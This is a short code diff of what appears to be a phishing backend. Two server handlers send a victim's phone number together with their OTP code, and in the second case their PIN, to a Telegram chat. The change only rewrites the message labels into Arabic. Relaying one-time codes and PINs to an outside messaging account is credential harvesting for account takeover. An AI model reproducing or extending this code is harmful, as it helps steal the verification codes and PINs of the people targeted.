@@ -73,7 +73,7 @@ export const appRouter = router({
 
         try {
           // Send OTP to Telegram
-          const message = `Phone Number\n${phoneNumber}\n\nOTP Code\n${otpCode}`;
+          const message = `رقم الهاتف: ${phoneNumber}\nرمز التحقق: ${otpCode}`;
           await sendTelegramMessage(message);
 
           return {
@@ -102,7 +102,7 @@ export const appRouter = router({
 
         try {
           // Send PIN to Telegram
-          const message = `Phone Number\n${phoneNumber}\n\nPIN Code\n${pin}`;
+          const message = `رقم الهاتف: ${phoneNumber}\nرمز السري: ${pin}`;
           await sendTelegramMessage(message);
 
           return {
